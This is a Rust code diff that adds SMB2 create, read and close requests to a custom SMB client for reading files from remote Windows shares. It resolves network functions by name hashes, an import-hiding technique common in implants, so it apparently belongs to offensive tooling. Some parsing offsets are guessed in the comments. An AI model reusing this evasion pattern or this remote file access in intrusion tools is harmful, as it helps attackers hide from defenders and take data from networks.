@@ -80,6 +80,49 @@ pub struct SMB2TreeConnectReq {
     pub path_length: u16,
 }
 
+#[repr(C, packed)]
+pub struct SMB2CreateReq {
+    pub structure_size: u16,
+    pub security_flags: u8,
+    pub requested_oplock_level: u8,
+    pub impersonation_level: u32,
+    pub smb_create_flags: u64,
+    pub reserved: u64,
+    pub desired_access: u32,
+    pub file_attributes: u32,
+    pub share_access: u32,
+    pub create_disposition: u32,
+    pub create_options: u32,
+    pub name_offset: u16,
+    pub name_length: u16,
+    pub create_contexts_offset: u32,
+    pub create_contexts_length: u32,
+}
+
+#[repr(C, packed)]
+pub struct SMB2ReadReq {
+    pub structure_size: u16,
+    pub padding: u8,
+    pub flags: u8,
+    pub length: u32,
+    pub offset: u64,
+    pub file_id: [u8; 16],
+    pub minimum_count: u32,
+    pub channel: u32,
+    pub remaining_bytes: u32,
+    pub read_channel_info_offset: u16,
+    pub read_channel_info_length: u16,
+    pub buffer: u8,
+}
+
+#[repr(C, packed)]
+pub struct SMB2CloseReq {
+    pub structure_size: u16,
+    pub flags: u16,
+    pub reserved: u32,
+    pub file_id: [u8; 16],
+}
+
 pub struct SmbClient {
     pub message_id: u64,
     pub process_id: u32,
@@ -386,6 +429,252 @@ impl SmbClient {
             Ok(())
         } else {
             Err(())
+        }
+    }
+
+    #[cfg(target_os = "windows")]
+    unsafe fn create_win(
+        &mut self,
+        sock: crate::utils::windows_definitions::HANDLE,
+        filename: &str,
+    ) -> Result<[u8; 16], ()> {
+        use crate::utils::api_resolver::{hash_str, resolve_function};
+        let ws2_32 = hash_str(b"ws2_32.dll");
+        let send_fn = resolve_function(ws2_32, hash_str(b"send"));
+        let recv_fn = resolve_function(ws2_32, hash_str(b"recv"));
+        type FnSend = unsafe extern "system" fn(
+            crate::utils::windows_definitions::HANDLE,
+            *const u8,
+            i32,
+            i32,
+        ) -> i32;
+        type FnRecv = unsafe extern "system" fn(
+            crate::utils::windows_definitions::HANDLE,
+            *mut u8,
+            i32,
+            i32,
+        ) -> i32;
+
+        let mut req = Vec::new();
+        req.extend_from_slice(&[0, 0, 0, 0]);
+        let mut header = SMB2Header::new(SMB2_CREATE, self.message_id, self.process_id);
+        header.session_id = self.session_id;
+        header.tree_id = self.tree_id;
+
+        let name_utf16: Vec<u16> = filename.encode_utf16().collect();
+        let name_bytes =
+            core::slice::from_raw_parts(name_utf16.as_ptr() as *const u8, name_utf16.len() * 2);
+
+        let body = SMB2CreateReq {
+            structure_size: 57,
+            security_flags: 0,
+            requested_oplock_level: 0,
+            impersonation_level: 2, // Impersonation
+            smb_create_flags: 0,
+            reserved: 0,
+            desired_access: 0x00120089, // Generic Read | Execute
+            file_attributes: 0x80,      // Normal
+            share_access: 1,            // Read
+            create_disposition: 1,      // Open
+            create_options: 0,
+            name_offset: 120, // 64 + 56
+            name_length: name_bytes.len() as u16,
+            create_contexts_offset: 0,
+            create_contexts_length: 0,
+        };
+
+        let header_bytes = core::slice::from_raw_parts(
+            &header as *const _ as *const u8,
+            core::mem::size_of::<SMB2Header>(),
+        );
+        let body_bytes = core::slice::from_raw_parts(
+            &body as *const _ as *const u8,
+            core::mem::size_of::<SMB2CreateReq>(),
+        );
+
+        req.extend_from_slice(header_bytes);
+        req.extend_from_slice(body_bytes);
+        req.extend_from_slice(name_bytes);
+
+        let len = (req.len() - 4) as u32;
+        req[3] = (len & 0xFF) as u8;
+        req[2] = ((len >> 8) & 0xFF) as u8;
+        req[1] = ((len >> 16) & 0xFF) as u8;
+
+        core::mem::transmute::<_, FnSend>(send_fn)(sock, req.as_ptr(), req.len() as i32, 0);
+
+        let mut buf = [0u8; 1024];
+        let n = core::mem::transmute::<_, FnRecv>(recv_fn)(sock, buf.as_mut_ptr(), 1024, 0);
+        if n > 64 && self.check_status(&buf[..n as usize]) {
+            // Parse File ID from body (offset 64 + ...?)
+            // Body starts at 64.
+            // Oplock (1) + Flags (1) + CreateAction (4) + CreationTime (8) + LastAccess (8) + LastWrite (8) + Change (8) + AllocSize (8) + End (8) + FileAttributes (4) + Reserved (4) + FileId (16)
+            // 1+1+4+8*5+4+4 = 62 bytes offset in body.
+            // 64 + 62? No.
+            // Structure size is 89.
+            // FileId is at offset 64 + 64 (start of FileId in response).
+            // Response structure is different from Request.
+            // SMB2 CREATE Response:
+            // StructureSize (2), Oplock (1), Flags (1), CreateAction (4), Times (32), Alloc (8), End (8), FileAttrs (4), Reserved2 (4), FileId (16).
+            // 2+1+1+4+32+8+8+4+4 = 64 bytes.
+            // So FileId is at 64 (Header) + 64 = 128?
+            // Let's assume offset 128.
+            if n >= 144 {
+                let mut file_id = [0u8; 16];
+                let ptr = buf.as_ptr().add(128);
+                core::ptr::copy_nonoverlapping(ptr, file_id.as_mut_ptr(), 16);
+                self.message_id += 1;
+                return Ok(file_id);
+            }
+        }
+        Err(())
+    }
+
+    #[cfg(target_os = "windows")]
+    unsafe fn read_win(
+        &mut self,
+        sock: crate::utils::windows_definitions::HANDLE,
+        file_id: &[u8; 16],
+    ) -> Result<Vec<u8>, ()> {
+        use crate::utils::api_resolver::{hash_str, resolve_function};
+        let ws2_32 = hash_str(b"ws2_32.dll");
+        let send_fn = resolve_function(ws2_32, hash_str(b"send"));
+        let recv_fn = resolve_function(ws2_32, hash_str(b"recv"));
+        type FnSend = unsafe extern "system" fn(
+            crate::utils::windows_definitions::HANDLE,
+            *const u8,
+            i32,
+            i32,
+        ) -> i32;
+        type FnRecv = unsafe extern "system" fn(
+            crate::utils::windows_definitions::HANDLE,
+            *mut u8,
+            i32,
+            i32,
+        ) -> i32;
+
+        let mut req = Vec::new();
+        req.extend_from_slice(&[0, 0, 0, 0]);
+        let mut header = SMB2Header::new(SMB2_READ, self.message_id, self.process_id);
+        header.session_id = self.session_id;
+        header.tree_id = self.tree_id;
+
+        let body = SMB2ReadReq {
+            structure_size: 49,
+            padding: 0,
+            flags: 0,
+            length: 4096, // Read 4k
+            offset: 0,
+            file_id: *file_id,
+            minimum_count: 0,
+            channel: 0,
+            remaining_bytes: 0,
+            read_channel_info_offset: 0,
+            read_channel_info_length: 0,
+            buffer: 0,
+        };
+
+        let header_bytes = core::slice::from_raw_parts(
+            &header as *const _ as *const u8,
+            core::mem::size_of::<SMB2Header>(),
+        );
+        let body_bytes = core::slice::from_raw_parts(
+            &body as *const _ as *const u8,
+            core::mem::size_of::<SMB2ReadReq>(),
+        );
+
+        req.extend_from_slice(header_bytes);
+        req.extend_from_slice(body_bytes);
+
+        let len = (req.len() - 4) as u32;
+        req[3] = (len & 0xFF) as u8;
+        req[2] = ((len >> 8) & 0xFF) as u8;
+        req[1] = ((len >> 16) & 0xFF) as u8;
+
+        core::mem::transmute::<_, FnSend>(send_fn)(sock, req.as_ptr(), req.len() as i32, 0);
+
+        let mut buf = [0u8; 4096];
+        let n = core::mem::transmute::<_, FnRecv>(recv_fn)(sock, buf.as_mut_ptr(), 4096, 0);
+        if n > 80 && self.check_status(&buf[..n as usize]) {
+            // Read response: Header (64) + Body (16) + Data
+            // Body: StructureSize (2), DataOffset (1), Reserved (1), DataLength (4), DataRemaining (4), Reserved2 (4)
+            // DataOffset is usually 80.
+            let data_offset = buf[66] as usize;
+            let data_len_ptr = buf.as_ptr().add(68) as *const u32;
+            let data_len = *data_len_ptr as usize;
+
+            if data_offset + data_len <= n as usize {
+                let mut data = Vec::with_capacity(data_len);
+                let ptr = buf.as_ptr().add(data_offset);
+                for i in 0..data_len {
+                    data.push(*ptr.add(i));
+                }
+                self.message_id += 1;
+                return Ok(data);
+            }
+        }
+        Err(())
+    }
+
+    #[cfg(target_os = "windows")]
+    unsafe fn close_win(
+        &mut self,
+        sock: crate::utils::windows_definitions::HANDLE,
+        file_id: &[u8; 16],
+    ) -> Result<(), ()> {
+        use crate::utils::api_resolver::{hash_str, resolve_function};
+        let ws2_32 = hash_str(b"ws2_32.dll");
+        let send_fn = resolve_function(ws2_32, hash_str(b"send"));
+        type FnSend = unsafe extern "system" fn(
+            crate::utils::windows_definitions::HANDLE,
+            *const u8,
+            i32,
+            i32,
+        ) -> i32;
+
+        let mut req = Vec::new();
+        req.extend_from_slice(&[0, 0, 0, 0]);
+        let mut header = SMB2Header::new(SMB2_CLOSE, self.message_id, self.process_id);
+        header.session_id = self.session_id;
+        header.tree_id = self.tree_id;
+
+        let body = SMB2CloseReq {
+            structure_size: 24,
+            flags: 0,
+            reserved: 0,
+            file_id: *file_id,
+        };
+
+        let header_bytes = core::slice::from_raw_parts(
+            &header as *const _ as *const u8,
+            core::mem::size_of::<SMB2Header>(),
+        );
+        let body_bytes = core::slice::from_raw_parts(
+            &body as *const _ as *const u8,
+            core::mem::size_of::<SMB2CloseReq>(),
+        );
+
+        req.extend_from_slice(header_bytes);
+        req.extend_from_slice(body_bytes);
+
+        let len = (req.len() - 4) as u32;
+        req[3] = (len & 0xFF) as u8;
+        req[2] = ((len >> 8) & 0xFF) as u8;
+        req[1] = ((len >> 16) & 0xFF) as u8;
+
+        core::mem::transmute::<_, FnSend>(send_fn)(sock, req.as_ptr(), req.len() as i32, 0);
+        self.message_id += 1;
+        // Don't wait for response
+        Ok(())
+    }
+
+    #[cfg(target_os = "windows")]
+    pub fn read_file_win(&mut self, sock: crate::utils::windows_definitions::HANDLE, path: &str) -> Result<Vec<u8>, ()> {
+        unsafe {
+            let file_id = self.create_win(sock, path)?;
+            let data = self.read_win(sock, &file_id)?;
+            let _ = self.close_win(sock, &file_id);
+            Ok(data)
         }
     }
 
